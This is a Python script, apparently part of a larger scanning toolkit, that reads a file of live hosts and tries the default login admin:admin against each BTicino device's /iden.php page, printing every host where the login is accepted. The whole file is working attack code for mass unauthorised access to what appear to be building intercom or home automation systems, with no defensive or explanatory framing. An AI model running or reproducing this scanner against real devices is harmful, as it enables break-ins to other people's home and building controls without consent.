import requests, re,ssl , os , sys
import urllib.request
import urllib.error
from host import host
class bticinoExploit:
    def biticinoExploit(self):
        pass
    def bticinoBruteForce(self):
        ctx = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
        path = os.path.abspath(os.path.dirname(sys.argv[0]))
        upHost = open(path + '/host/up_host.txt', 'r').read().splitlines()
        a = 0
        while a < len(upHost):
            try:
                res = upHost[a]
                address = host.Host.addressRegex(res)
                head = b'login=admin&password=admin&B1.y=0&B1.x=0&PERMISSION='
                url='https://' + address['ip'] + ':' + str(address['port'])+  "/iden.php"
                pageAction = urllib.request.urlopen(url, head, context=ctx)
                r = pageAction.read()
                if b'errati' in r or b'Wrong' in r or b'incorrectos' in r or b'incorrect' in r or b'Falsches' in r:
                    pass
                else:
                    print("[-]Found "+ url + " with password admin:admin")
            except TimeoutError:
                break
            except:
                pass
            a += 1
